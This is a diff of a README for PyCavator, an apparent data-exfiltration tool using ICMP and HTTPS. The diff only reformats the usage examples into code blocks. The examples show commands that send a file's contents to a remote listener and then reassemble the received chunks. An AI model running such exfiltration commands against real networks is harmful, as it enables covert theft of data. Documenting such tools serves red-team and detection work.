@@ -15,17 +15,21 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP packets i
 
 #### Examples:
   <b>Sender mode: exfiltrate data from a file</b><br/>
-  python pycavator-icmp.py -f input.txt -d 192.168.1.101
-  
+```bash  
+python pycavator-icmp.py -f input.txt -d 192.168.1.101
+```  
   <b>Listener mode: listen for incoming data and save in chunks</b><br/>
-  python pycavator-icmp.py -l -s 192.168.1.100 -w c
-  
+```bash
+python pycavator-icmp.py -l -s 192.168.1.100 -w c
+```  
   <b>Listener mode: listen for incoming data and save to a single file</b><br/>
-  python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
-  
+```bash  
+python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
+```  
   <b>Merge mode: merge output files with part numbers in the specified range</b><br/>
-  python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
-
+```bash
+python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
+```
 
 ### HTTPS mode
 
@@ -38,13 +42,13 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP packets i
 
 #### Examples:
   <b>Sender mode: exfiltrate data from a file</b><br/>
-  ```bash
-  python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
-  ```
+```bash
+python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
+```
   <b>Listener mode: listen for incoming data and save to a single file</b><br/>
-  ```bash
-  python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..._adQssw5c"
-  ``` 
+```bash
+python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..._adQssw5c"
+``` 
 
 ## Installation
 
